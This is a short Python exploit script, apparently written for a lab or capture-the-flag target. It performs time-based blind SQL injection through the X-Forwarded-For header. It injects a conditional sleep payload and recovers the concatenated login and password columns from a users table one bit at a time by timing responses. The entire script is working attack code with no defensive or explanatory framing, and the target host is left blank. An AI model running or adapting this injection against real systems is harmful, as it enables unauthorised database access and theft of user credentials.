#!/usr/bin/env python3

import requests
from time import time

VULNERABLE_HOST = ""
PORT = 80
# use burp to intercept requests
PROXIES = {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"}

sleep_setting = 2
select_version = "select concat(login,':',password) from users"

def make_request(sql):
    injection = f"hacker' or if(({sql}),sleep({sleep_setting}),0) and '1'='1"
    headers = {"X-Forwarded-For": f"{injection}"}

    tic = time()
    r = requests.get(VULNERABLE_HOST, proxies=None, verify=False, headers=headers)
    toc = time()
    run_time = toc - tic

    if (run_time > sleep_setting):
        return True
    else:
        return False

i = 0
value = 1
result = ""

while value !=0:
    i += 1
    value = 0
    for bit in range(0,7):
        sql = f"select ascii(substring(({select_version}),{i},1))&{2**bit}"
        if make_request(sql) == True:
            value += 2**bit
    result += chr(value)
    print(f"In progress, so far it is {result}")

print(f"final result is: {result}")

